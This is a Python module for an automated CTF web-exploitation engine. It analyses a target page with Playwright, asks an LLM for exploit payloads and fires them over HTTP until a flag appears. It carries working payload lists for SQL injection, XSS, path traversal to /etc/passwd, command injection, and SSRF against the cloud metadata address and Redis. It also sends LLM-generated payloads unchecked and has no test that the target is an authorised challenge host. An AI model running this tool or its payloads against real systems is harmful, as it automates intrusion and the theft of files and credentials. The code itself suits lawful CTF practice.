"""
Web Solver - CTF 웹 취약점 자동 풀이 (Playwright 기반 페이지 분석)
"""

import asyncio
import re
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

from .llm_reasoner import LLMReasoner, CTFAnalysis
from .tool_executor import ToolExecutor, ToolResult


@dataclass
class PageAnalysis:
    """페이지 분석 결과"""
    html: str
    forms: List[Dict[str, Any]]
    scripts: List[str]
    comments: List[str]
    visible_text: str
    cookies: Dict[str, str]
    headers: Dict[str, str]
    endpoints: List[str]


@dataclass
class WebExploitResult:
    """웹 취약점 결과"""
    vulnerability_type: str
    success: bool
    flag: Optional[str]
    payload: str
    response: str
    confidence: float


class WebSolver:
    """CTF 웹 취약점 자동 풀이 엔진"""

    def __init__(self, llm: LLMReasoner, executor: ToolExecutor):
        self.llm = llm
        self.executor = executor

    async def solve(self, url: str, challenge_info: Dict) -> Dict:
        """
        웹 취약점 자동 풀이 (페이지 분석 기반)

        Args:
            url: 대상 URL
            challenge_info: 문제 정보

        Returns:
            풀이 결과
        """
        print(f"  🌐 페이지 분석 중: {url}")

        # 1. Playwright로 페이지 실제 분석
        page_analysis = await self._fetch_and_analyze_page(url)

        if not page_analysis:
            print("  ⚠️  페이지 분석 실패, 기본 분석으로 진행")
            page_analysis = PageAnalysis(
                html='', forms=[], scripts=[], comments=[],
                visible_text='', cookies={}, headers={}, endpoints=[]
            )

        # 2. LLM으로 문제 분석 (실제 페이지 내용 포함)
        print("  🤖 LLM 분석 중...")
        analysis = await self.llm.analyze_challenge({
            'title': challenge_info.get('title', ''),
            'description': challenge_info.get('description', ''),
            'url': url,
            'hints': challenge_info.get('hints', []),
            # ✅ 실제 페이지 내용 추가
            'html_snippet': page_analysis.html[:2000],  # 앞부분만
            'forms': page_analysis.forms,
            'comments': page_analysis.comments,
            'visible_text': page_analysis.visible_text[:1000],
            'endpoints': page_analysis.endpoints
        })

        if analysis.category != 'web':
            return {
                'success': False,
                'error': f'Not a web challenge: {analysis.category}'
            }

        print(f"  🎯 취약점 유형: {analysis.vulnerability_type}")

        # 3. 취약점 유형별 처리 (페이지 분석 정보 전달)
        vuln_type = analysis.vulnerability_type.lower()

        if 'sql injection' in vuln_type or 'sqli' in vuln_type:
            result = await self._solve_sqli(url, analysis, page_analysis)
        elif 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
            result = await self._solve_xss(url, analysis, page_analysis)
        elif 'lfi' in vuln_type or 'local file inclusion' in vuln_type:
            result = await self._solve_lfi(url, analysis, page_analysis)
        elif 'rfi' in vuln_type or 'remote file inclusion' in vuln_type:
            result = await self._solve_rfi(url, analysis, page_analysis)
        elif 'command injection' in vuln_type or 'rce' in vuln_type:
            result = await self._solve_command_injection(url, analysis, page_analysis)
        elif 'ssrf' in vuln_type:
            result = await self._solve_ssrf(url, analysis, page_analysis)
        else:
            result = await self._generic_web_exploit(url, analysis, page_analysis)

        return {
            'success': result.success,
            'flag': result.flag,
            'vulnerability_type': result.vulnerability_type,
            'payload': result.payload,
            'confidence': result.confidence,
            'analysis': analysis,
            'page_analysis': {
                'forms': len(page_analysis.forms),
                'scripts': len(page_analysis.scripts),
                'comments': len(page_analysis.comments)
            }
        }

    async def _fetch_and_analyze_page(self, url: str) -> Optional[PageAnalysis]:
        """
        Playwright로 페이지 실제 분석

        Returns:
            PageAnalysis 또는 None (실패 시)
        """
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            print("  ⚠️  Playwright가 설치되지 않음 (pip install playwright)")
            return None

        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(
                    ignore_https_errors=True,
                    user_agent='Mozilla/5.0 CTF Bot'
                )
                page = await context.new_page()

                # 페이지 로드
                await page.goto(url, wait_until='networkidle', timeout=15000)

                # HTML 가져오기
                html = await page.content()

                # Form 구조 추출
                forms = await page.evaluate('''() => {
                    return Array.from(document.forms).map(form => ({
                        action: form.action,
                        method: form.method.toUpperCase(),
                        fields: Array.from(form.elements).filter(el => el.name).map(el => ({
                            name: el.name,
                            type: el.type || 'text',
                            value: el.value || '',
                            required: el.required || false
                        }))
                    }))
                }''')

                # JavaScript 파일/코드 추출
                scripts = await page.evaluate('''() => {
                    return Array.from(document.scripts).map(s =>
                        s.src || s.textContent.substring(0, 500)
                    ).filter(s => s.trim())
                }''')

                # HTML 주석 추출
                comments = await page.evaluate('''() => {
                    const walker = document.createTreeWalker(
                        document.documentElement,
                        NodeFilter.SHOW_COMMENT
                    );
                    const comments = [];
                    while (walker.nextNode()) {
                        comments.push(walker.currentNode.textContent.trim());
                    }
                    return comments;
                }''')

                # 보이는 텍스트
                visible_text = await page.inner_text('body')

                # 쿠키
                cookies = {c['name']: c['value'] for c in await context.cookies()}

                # 헤더 (응답)
                response = await page.goto(url)
                headers = dict(response.headers) if response else {}

                # API 엔드포인트 추출 (a 태그, fetch 호출 등)
                endpoints = await page.evaluate('''() => {
                    const urls = new Set();
                    // a 태그
                    document.querySelectorAll('a[href]').forEach(a => {
                        try {
                            const url = new URL(a.href, window.location.origin);
                            if (url.pathname !== '/') urls.add(url.pathname);
                        } catch (e) {}
                    });
                    // form action
                    document.querySelectorAll('form[action]').forEach(f => {
                        try {
                            const url = new URL(f.action, window.location.origin);
                            urls.add(url.pathname);
                        } catch (e) {}
                    });
                    return Array.from(urls);
                }''')

                await browser.close()

                print(f"  ✅ 페이지 분석 완료: {len(forms)} forms, {len(comments)} comments")

                return PageAnalysis(
                    html=html,
                    forms=forms,
                    scripts=scripts[:10],  # 최대 10개
                    comments=comments,
                    visible_text=visible_text,
                    cookies=cookies,
                    headers=headers,
                    endpoints=endpoints
                )

        except Exception as e:
            print(f"  ❌ 페이지 분석 실패: {e}")
            return None

    # === SQL Injection ===

    async def _solve_sqli(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
        """SQL Injection 자동 풀이 (타겟팅)"""
        print(f"  🔍 SQL Injection 탐지 시도: {url}")

        # ✅ 페이지 분석에서 form 정보 추출
        target_forms = page_analysis.forms
        if not target_forms:
            print("  ⚠️  Form이 없음, URL 파라미터 타겟팅")
            target_forms = [{'action': url, 'method': 'GET', 'fields': [{'name': 'id', 'type': 'text'}]}]

        for form in target_forms:
            print(f"  📝 Form 분석: {form['action']} ({form['method']})")
            print(f"     필드: {[f['name'] for f in form['fields']]}")

            # 각 필드에 SQL Injection 시도
            for field in form['fields']:
                field_name = field['name']
                print(f"  🎯 타겟 필드: {field_name}")

                # 기본 SQL Injection 페이로드
                sqli_payloads = [
                    "admin' OR 1=1--",
                    "admin' OR '1'='1",
                    "' OR 1=1--",
                    "' OR '1'='1'--",
                    "1' UNION SELECT NULL--",
                    "admin'--",
                ]

                # LLM에게 추가 페이로드 요청 (페이지 정보 포함)
                exploit_code = await self.llm.generate_exploit(
                    analysis,
                    context=f"""
Form: {form['action']} ({form['method']})
Target field: {field_name}
HTML comments: {page_analysis.comments}
Visible text: {page_analysis.visible_text[:500]}

Generate SQL injection payloads for this specific field.
                    """.strip()
                )

                llm_payloads = self._extract_payloads_from_llm(exploit_code)
                all_payloads = llm_payloads + sqli_payloads

                # 타겟팅된 공격 실행
                for payload in all_payloads[:10]:
                    # Form의 다른 필드도 채우기
                    data = {f['name']: (payload if f['name'] == field_name else 'test')
                            for f in form['fields']}

                    result = await self._test_payload_advanced(
                        url=form['action'],
                        method=form['method'],
                        data=data
                    )

                    if result['success']:
                        flag = self._extract_flag(result['response'])
                        if flag or 'admin' in result['response'].lower():
                            return WebExploitResult(
                                vulnerability_type='SQL Injection (Targeted)',
                                success=True,
                                flag=flag,
                                payload=f"{field_name}={payload}",
                                response=result['response'][:1000],
                                confidence=0.9
                            )

        # 모든 시도 실패
        return WebExploitResult(
            vulnerability_type='SQL Injection',
            success=False,
            flag=None,
            payload='',
            response='All targeted attempts failed',
            confidence=0.0
        )

    # === XSS ===

    async def _solve_xss(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
        """XSS 자동 풀이"""
        print(f"  🔍 XSS 탐지 시도: {url}")

        # LLM으로 XSS 페이로드 생성
        exploit_code = await self.llm.generate_exploit(
            analysis,
            context="Generate XSS payloads to extract flag"
        )

        payloads = self._extract_payloads_from_llm(exploit_code)

        # 기본 XSS 페이로드 추가
        default_payloads = [
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<iframe src="javascript:alert(1)">',
        ]

        all_payloads = payloads + default_payloads

        for payload in all_payloads[:10]:
            result = await self._test_payload(url, payload)

            if result['success']:
                flag = self._extract_flag(result['response'])
                return WebExploitResult(
                    vulnerability_type='XSS',
                    success=True,
                    flag=flag,
                    payload=payload,
                    response=result['response'][:1000],
                    confidence=0.8
                )

        return WebExploitResult(
            vulnerability_type='XSS',
            success=False,
            flag=None,
            payload='',
            response='No XSS vulnerability found',
            confidence=0.0
        )

    # === LFI/RFI ===

    async def _solve_lfi(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
        """Local File Inclusion 자동 풀이"""
        print(f"  🔍 LFI 탐지 시도: {url}")

        # 일반적인 LFI 페이로드
        lfi_payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '/etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input',
            'file:///etc/passwd',
        ]

        # LLM으로 추가 페이로드 생성
        exploit_code = await self.llm.generate_exploit(
            analysis,
            context="Generate LFI payloads"
        )

        llm_payloads = self._extract_payloads_from_llm(exploit_code)
        all_payloads = llm_payloads + lfi_payloads

        for payload in all_payloads[:15]:
            result = await self._test_payload(url, payload, param='file')

            if result['success'] and ('root:' in result['response'] or 'flag{' in result['response']):
                flag = self._extract_flag(result['response'])
                return WebExploitResult(
                    vulnerability_type='LFI',
                    success=True,
                    flag=flag,
                    payload=payload,
                    response=result['response'][:1000],
                    confidence=0.85
                )

        return WebExploitResult(
            vulnerability_type='LFI',
            success=False,
            flag=None,
            payload='',
            response='No LFI vulnerability found',
            confidence=0.0
        )

    async def _solve_rfi(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
        """Remote File Inclusion 자동 풀이"""
        print(f"  🔍 RFI 탐지 시도: {url}")

        # RFI는 외부 서버 필요 → LLM에게 전략 요청
        exploit_code = await self.llm.generate_exploit(
            analysis,
            context="Generate RFI exploitation strategy (need external server)"
        )

        return WebExploitResult(
            vulnerability_type='RFI',
            success=False,
            flag=None,
            payload='',
            response='RFI requires external server setup',
            confidence=0.0
        )

    # === Command Injection ===

    async def _solve_command_injection(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
        """Command Injection 자동 풀이"""
        print(f"  🔍 Command Injection 탐지 시도: {url}")

        # 일반적인 Command Injection 페이로드
        cmd_payloads = [
            '; ls',
            '| ls',
            '`ls`',
            '$(ls)',
            '; cat flag.txt',
            '| cat /flag.txt',
            '; find / -name flag.txt 2>/dev/null',
            '`cat /etc/passwd`',
        ]

        # LLM으로 추가 페이로드 생성
        exploit_code = await self.llm.generate_exploit(
            analysis,
            context="Generate command injection payloads"
        )

        llm_payloads = self._extract_payloads_from_llm(exploit_code)
        all_payloads = llm_payloads + cmd_payloads

        for payload in all_payloads[:15]:
            result = await self._test_payload(url, payload)

            if result['success']:
                flag = self._extract_flag(result['response'])
                if flag:
                    return WebExploitResult(
                        vulnerability_type='Command Injection',
                        success=True,
                        flag=flag,
                        payload=payload,
                        response=result['response'][:1000],
                        confidence=0.9
                    )

        return WebExploitResult(
            vulnerability_type='Command Injection',
            success=False,
            flag=None,
            payload='',
            response='No command injection found',
            confidence=0.0
        )

    # === SSRF ===

    async def _solve_ssrf(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
        """SSRF 자동 풀이"""
        print(f"  🔍 SSRF 탐지 시도: {url}")

        # SSRF 페이로드
        ssrf_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'file:///etc/passwd',
            'gopher://127.0.0.1:6379/_',  # Redis
        ]

        for payload in ssrf_payloads:
            result = await self._test_payload(url, payload, param='url')

            if result['success']:
                flag = self._extract_flag(result['response'])
                return WebExploitResult(
                    vulnerability_type='SSRF',
                    success=True,
                    flag=flag,
                    payload=payload,
                    response=result['response'][:1000],
                    confidence=0.8
                )

        return WebExploitResult(
            vulnerability_type='SSRF',
            success=False,
            flag=None,
            payload='',
            response='No SSRF vulnerability found',
            confidence=0.0
        )

    # === Generic Web Exploit ===

    async def _generic_web_exploit(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
        """알 수 없는 웹 취약점 → LLM에게 전체 풀이 요청"""
        print(f"  🤖 LLM 기반 일반 웹 공격 시도: {url}")

        exploit_code = await self.llm.generate_exploit(
            analysis,
            context=f"URL: {url}\nGenerate complete exploit code"
        )

        # LLM이 생성한 코드 분석
        payloads = self._extract_payloads_from_llm(exploit_code)

        for payload in payloads[:10]:
            result = await self._test_payload(url, payload)

            if result['success']:
                flag = self._extract_flag(result['response'])
                if flag:
                    return WebExploitResult(
                        vulnerability_type='Generic Web',
                        success=True,
                        flag=flag,
                        payload=payload,
                        response=result['response'][:1000],
                        confidence=0.6
                    )

        return WebExploitResult(
            vulnerability_type='Generic Web',
            success=False,
            flag=None,
            payload='',
            response='LLM-based exploit failed',
            confidence=0.0
        )

    # === Helper Methods ===

    async def _test_payload_advanced(self, url: str, method: str, data: Dict[str, str]) -> Dict:
        """
        고급 페이로드 테스트 (Form 데이터 전송)

        Args:
            url: 대상 URL
            method: HTTP 메서드 (GET/POST)
            data: 전송할 데이터 (dict)

        Returns:
            {'success': bool, 'response': str, 'status_code': int}
        """
        try:
            import httpx

            async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=True) as client:
                if method.upper() == 'GET':
                    response = await client.get(url, params=data)
                elif method.upper() == 'POST':
                    response = await client.post(url, data=data)
                else:
                    return {
                        'success': False,
                        'response': '',
                        'status_code': 0
                    }

                return {
                    'success': response.status_code == 200,
                    'response': response.text,
                    'status_code': response.status_code
                }

        except Exception as e:
            print(f"  ⚠️  HTTP 요청 실패: {e}")
            return {
                'success': False,
                'response': '',
                'status_code': 0
            }

    async def _test_payload(self, url: str, payload: str, param: str = 'id', method: str = 'GET') -> Dict:
        """
        페이로드 테스트 (실제 HTTP 요청)

        Args:
            url: 대상 URL
            payload: 테스트 페이로드
            param: 파라미터 이름
            method: HTTP 메서드 (GET/POST)

        Returns:
            {'success': bool, 'response': str, 'status_code': int}
        """
        try:
            import httpx

            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                if method.upper() == 'GET':
                    response = await client.get(url, params={param: payload})
                elif method.upper() == 'POST':
                    response = await client.post(url, data={param: payload})
                else:
                    return {
                        'success': False,
                        'response': '',
                        'status_code': 0
                    }

                return {
                    'success': response.status_code == 200,
                    'response': response.text,
                    'status_code': response.status_code
                }

        except Exception as e:
            print(f"  ⚠️  HTTP 요청 실패: {e}")
            return {
                'success': False,
                'response': '',
                'status_code': 0
            }

    def _extract_flag(self, text: str) -> Optional[str]:
        """텍스트에서 플래그 추출"""
        import re

        # 일반적인 플래그 패턴
        patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'[A-Za-z0-9_]+\{[^}]+\}',
        ]

        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(0)

        return None

    def _extract_payloads_from_llm(self, llm_output: str) -> List[str]:
        """LLM 출력에서 페이로드 추출"""
        payloads = []

        # 코드 블록 추출
        import re
        code_blocks = re.findall(r'```(?:python|bash)?\n(.*?)\n```', llm_output, re.DOTALL)

        for block in code_blocks:
            # 간단한 문자열 추출 (실제 구현에서는 더 정교하게)
            lines = block.split('\n')
            for line in lines:
                if 'payload' in line.lower() or "'" in line or '"' in line:
                    # 문자열 추출
                    strings = re.findall(r'["\']([^"\']+)["\']', line)
                    payloads.extend(strings)

        return payloads[:20]  # 최대 20개
